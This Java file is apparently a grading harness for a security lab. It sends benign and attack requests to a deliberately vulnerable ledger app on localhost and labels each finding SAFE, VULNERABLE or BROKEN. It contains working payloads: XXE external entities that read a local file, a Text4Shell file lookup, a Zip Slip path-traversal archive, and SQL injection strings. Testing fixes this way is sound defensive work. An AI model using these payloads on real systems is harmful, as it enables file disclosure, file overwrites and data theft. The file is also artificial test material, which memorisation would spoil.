// Lab 8b exploit probes. Runs against a ledger app on localhost:8080 inside a --network none container.
// For each finding: a benign request (does the feature still work?) and an attack (does the hole still exist?).
// Verdicts: SAFE (works, attack fails), VULNERABLE (attack succeeds), BROKEN (benign request fails).
// Kept outside the repo the agents edit, so no agent can fix to the test.
//   java Probe.java <canary-file> <canary-text> <out.jsonl>
import java.io.ByteArrayOutputStream;
import java.net.URI;
import java.net.URLEncoder;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class Probe {
    static final HttpClient HTTP = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5)).build();
    static final String BASE = "http://localhost:8080";
    static String canaryFile, canary;
    static final List<String> out = new ArrayList<>();

    record Resp(int status, String body) { }

    static Resp post(String path, String type, byte[] body) {
        try {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(BASE + path)).timeout(Duration.ofSeconds(20))
                    .header("Content-Type", type).POST(HttpRequest.BodyPublishers.ofByteArray(body)).build(),
                    HttpResponse.BodyHandlers.ofString());
            return new Resp(r.statusCode(), r.body());
        } catch (Exception e) {
            return new Resp(-1, e.toString());
        }
    }

    static Resp get(String path) {
        try {
            var r = HTTP.send(HttpRequest.newBuilder(URI.create(BASE + path)).timeout(Duration.ofSeconds(20)).GET().build(),
                    HttpResponse.BodyHandlers.ofString());
            return new Resp(r.statusCode(), r.body());
        } catch (Exception e) {
            return new Resp(-1, e.toString());
        }
    }

    static byte[] b(String s) { return s.getBytes(StandardCharsets.UTF_8); }
    static String q(String s) { return URLEncoder.encode(s, StandardCharsets.UTF_8); }
    static String esc(String s) { return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n"); }

    static void verdict(String id, String where, Resp benign, boolean benignOk, Resp attack, boolean exploited) {
        String v = !benignOk ? "BROKEN" : exploited ? "VULNERABLE" : "SAFE";
        String detail = !benignOk ? "benign " + benign.status() + ": " + clip(benign.body())
                : "attack " + attack.status() + ": " + clip(attack.body());
        System.out.printf("%-12s %-11s %s%n", id, v, where);
        out.add("{\"id\":\"%s\",\"verdict\":\"%s\",\"where\":\"%s\",\"detail\":\"%s\"}".formatted(id, v, where, esc(detail)));
    }

    static String clip(String s) { s = s.strip(); return s.length() > 160 ? s.substring(0, 160) + "..." : s; }

    static String doctype(String root) {
        return "<?xml version=\"1.0\"?>\n<!DOCTYPE " + root + " [<!ENTITY x SYSTEM \"file://" + canaryFile + "\">]>\n";
    }

    static byte[] zip(String name, String content) throws Exception {
        var bytes = new ByteArrayOutputStream();
        try (var z = new ZipOutputStream(bytes)) {
            z.putNextEntry(new ZipEntry(name));
            z.write(b(content));
            z.closeEntry();
        }
        return bytes.toByteArray();
    }

    public static void main(String[] a) throws Exception {
        canaryFile = a[0]; canary = a[1];

        // XXE 1: DOM (DocumentBuilderFactory), the one the scanner names
        var ok = post("/statements/import", "application/xml", b("<statement><entry><bookingDate>2026-10-01</bookingDate>"
                + "<amount>1</amount><memo>salary</memo></entry></statement>"));
        var atk = post("/statements/import", "application/xml", b(doctype("statement") + "<statement><entry>"
                + "<bookingDate>2026-10-01</bookingDate><amount>1</amount><memo>&x;</memo></entry></statement>"));
        verdict("xxe-dom", "ledger-statements StatementImporter", ok, ok.status() == 200 && ok.body().contains("salary"),
                atk, atk.body().contains(canary));

        // XXE 2: StAX (XMLInputFactory), not named by the scanner
        ok = post("/reports/metadata", "application/xml", b("<report><title>Month end</title><branch>Leeds</branch><period>2026-10</period></report>"));
        atk = post("/reports/metadata", "application/xml", b(doctype("report") + "<report><title>&x;</title><branch>L</branch><period>p</period></report>"));
        verdict("xxe-stax", "ledger-reports ReportMetadataReader", ok, ok.status() == 200 && ok.body().contains("Month end"),
                atk, atk.body().contains(canary));

        // XXE 3: SAX (SAXParserFactory), not named by the scanner
        ok = post("/accounts/import", "application/xml", b("<accounts><account id=\"T1\" balance=\"1\">Probe Benign</account></accounts>"));
        atk = post("/accounts/import", "application/xml", b(doctype("accounts") + "<accounts><account id=\"T2\" balance=\"1\">&x;</account></accounts>"));
        verdict("xxe-sax", "ledger-accounts AccountListImporter", ok, ok.status() == 200 && ok.body().contains("Probe Benign"),
                atk, atk.body().contains(canary));

        // Text4Shell: commons-text interpolation (url: lookup reads a local file; no network needed)
        ok = post("/notices/preview?name=Ada", "text/plain", b("Dear ${name}"));
        atk = post("/notices/preview", "text/plain", b("${url:UTF-8:file://" + canaryFile + "}"));
        verdict("text4shell", "ledger-common NoticeRenderer", ok, ok.status() == 200 && ok.body().contains("Dear Ada"),
                atk, atk.body().contains(canary));

        // Zip Slip: an entry that climbs out of the bundle folder
        Path proof = Path.of("/tmp/ledger-zipslip-proof.txt");
        Files.deleteIfExists(proof);
        ok = post("/reports/upload", "application/zip", zip("october/balances.csv", "a,b\n"));
        atk = post("/reports/upload", "application/zip", zip("../../../../../../../../tmp/ledger-zipslip-proof.txt", "owned"));
        verdict("zipslip", "ledger-reports ReportArchiveService", ok, ok.status() == 200 && ok.body().contains("balances.csv"),
                atk, Files.exists(proof));

        // SQL injection 1: the search the scanner names. HOLD1 is restricted and must never be listed.
        ok = get("/accounts/search?owner=" + q("A. N. Other"));
        atk = get("/accounts/search?owner=" + q("x' OR '1'='1"));
        verdict("sqli-search", "ledger-accounts AccountRepository.findByOwner", ok,
                ok.status() == 200 && ok.body().contains("GB02"), atk, atk.body().contains("HOLD1"));

        // SQL injection 2: the copy-pasted query the scanner doesn't name
        ok = get("/accounts/overdrawn?prefix=" + q("J."));
        atk = get("/accounts/overdrawn?prefix=" + q("x' OR restricted = true OR owner LIKE 'zz"));
        verdict("sqli-overdrawn", "ledger-accounts AccountRepository.findOverdrawn", ok,
                ok.status() == 200 && ok.body().contains("GB01"), atk, atk.body().contains("HOLD1"));

        Files.write(Path.of(a[2]), out);
    }
}
